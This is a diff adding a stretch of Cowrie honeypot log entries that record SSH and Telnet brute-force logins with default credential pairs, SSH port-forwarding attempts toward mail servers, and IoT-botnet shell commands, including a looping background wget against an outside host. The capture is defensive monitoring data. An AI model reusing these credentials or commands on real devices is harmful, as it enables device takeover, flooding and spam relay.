@@ -5524,3 +5524,89 @@
 2017-03-22T20:05:00+0000 [HoneyPotSSHTransport,44101,91.197.235.11] NEW KEYS
 2017-03-22T20:05:00+0000 [HoneyPotSSHTransport,44101,91.197.235.11] starting service 'ssh-userauth'
 2017-03-22T20:05:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,44101,91.197.235.11] '1111' trying auth 'password'
+2017-03-22T20:05:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,44101,91.197.235.11] login attempt: 305
+2017-03-22T20:05:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,44101,91.197.235.11] login return, expect: [admin/1111]
+2017-03-22T20:05:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,44101,91.197.235.11] login attempt [1111/1111] failed
+2017-03-22T20:05:03+0000 [SSHChannel None (107) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43990,194.88.107.25] direct-tcp forward to 98.138.112.33:25 with data 'QUIT\r\n'
+2017-03-22T20:05:03+0000 [SSHChannel None (107) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43990,194.88.107.25] failed to connect: Connection refused
+2017-03-22T20:05:03+0000 [SSHChannel None (107) on SSHService 'ssh-connection' on HoneyPotSSHTransport,43990,194.88.107.25] sending close 107
+2017-03-22T20:05:03+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: killall wget; killall ping; killall sh
+2017-03-22T20:05:03+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: killall wget
+2017-03-22T20:05:03+0000 [CowrieTelnetTransport,110280,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-22T20:05:03+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: killall ping
+2017-03-22T20:05:03+0000 [CowrieTelnetTransport,110280,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-22T20:05:03+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: killall sh
+2017-03-22T20:05:03+0000 [CowrieTelnetTransport,110280,93.174.95.38] Reading txtcmd from "txtcmds/usr/bin/killall"
+2017-03-22T20:05:04+0000 [-] '1111' failed auth 'password'
+2017-03-22T20:05:04+0000 [-] unauthorized login: 
+2017-03-22T20:05:04+0000 [HoneyPotSSHTransport,44101,91.197.235.11] connection lost
+2017-03-22T20:05:04+0000 [HoneyPotSSHTransport,44101,91.197.235.11] Connection lost after 4 seconds
+2017-03-22T20:05:06+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-22T20:05:06+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] direct-tcp connection request to 144.160.159.21:25 from localhost:5556
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: shell
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: shell
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: enable
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: enable 
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: system
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: system
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: sh
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: sh 
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: run
+2017-03-22T20:05:13+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: run
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done" &
+2017-03-22T20:05:23+0000 [CowrieTelnetTransport,110280,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://www.datasaversllc.com:80/ > /dev/null 2> /dev/null; done"
+2017-03-22T20:05:28+0000 [CowrieTelnetTransport,110281,1.34.36.99] Connection lost after 41 seconds
+2017-03-22T20:05:29+0000 [SSHChannel None (564) on SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] remote eof
+2017-03-22T20:05:29+0000 [SSHChannel None (564) on SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] remote close
+2017-03-22T20:05:29+0000 [SSHChannel None (564) on SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] sending close 564
+2017-03-22T20:05:30+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 1.34.36.99:35187 (10.8.41.81:2223) [session: TT110282]
+2017-03-22T20:05:31+0000 [CowrieTelnetTransport,110266,109.201.134.2] Closing TTY Log: log/tty/20170322-200235-None-110266i.log after 175 seconds
+2017-03-22T20:05:31+0000 [CowrieTelnetTransport,110266,109.201.134.2] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-03-22T20:05:31+0000 [CowrieTelnetTransport,110266,109.201.134.2] Connection lost after 207 seconds
+2017-03-22T20:05:32+0000 [CowrieTelnetTransport,110282,1.34.36.99] login attempt: 5
+2017-03-22T20:05:32+0000 [CowrieTelnetTransport,110282,1.34.36.99] login return, expect: [root/win1dows ]
+2017-03-22T20:05:34+0000 [CowrieTelnetTransport,110282,1.34.36.99] login attempt [root/win1dows\x00] succeeded
+2017-03-22T20:05:35+0000 [CowrieTelnetTransport,110282,1.34.36.99] Opening TTY Log: log/tty/20170322-200535-None-110282i.log
+2017-03-22T20:05:35+0000 [CowrieTelnetTransport,110282,1.34.36.99] Warning: state changed and new state returned
+2017-03-22T20:05:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44036,194.88.106.206] got channel 'direct-tcpip' request
+2017-03-22T20:05:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44036,194.88.106.206] direct-tcp connection request to 195.154.156.29:25 from localhost:5556
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] Received unhandled keyID: '\x00'
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] CMD: enable
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] Command found: enable 
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] Reading txtcmd from "txtcmds/bin/enable"
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] Received unhandled keyID: '\x00'
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] CMD: system
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] Command not found: system
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] Received unhandled keyID: '\x00'
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] CMD: shell
+2017-03-22T20:05:36+0000 [CowrieTelnetTransport,110282,1.34.36.99] Command not found: shell
+2017-03-22T20:05:37+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43990,194.88.107.25] got channel 'direct-tcpip' request
+2017-03-22T20:05:37+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,43990,194.88.107.25] direct-tcp connection request to 98.138.112.33:25 from localhost:5556
+2017-03-22T20:05:37+0000 [CowrieTelnetTransport,110282,1.34.36.99] Received unhandled keyID: '\x00'
+2017-03-22T20:05:37+0000 [CowrieTelnetTransport,110282,1.34.36.99] CMD: sh
+2017-03-22T20:05:37+0000 [CowrieTelnetTransport,110282,1.34.36.99] Command found: sh 
+2017-03-22T20:05:37+0000 [CowrieTelnetTransport,110282,1.34.36.99] Received unhandled keyID: '\x00'
+2017-03-22T20:05:37+0000 [CowrieTelnetTransport,110282,1.34.36.99] CMD: fgrep XDVR /mnt/mtd/dep2.sh
+2017-03-22T20:05:37+0000 [CowrieTelnetTransport,110282,1.34.36.99] Command found: fgrep XDVR /mnt/mtd/dep2.sh
+2017-03-22T20:05:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-22T20:05:38+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] direct-tcp connection request to 212.227.15.41:25 from localhost:5556
+2017-03-22T20:05:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] got channel 'direct-tcpip' request
+2017-03-22T20:05:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,44047,194.88.106.181] direct-tcp connection request to 213.199.154.170:25 from localhost:5556
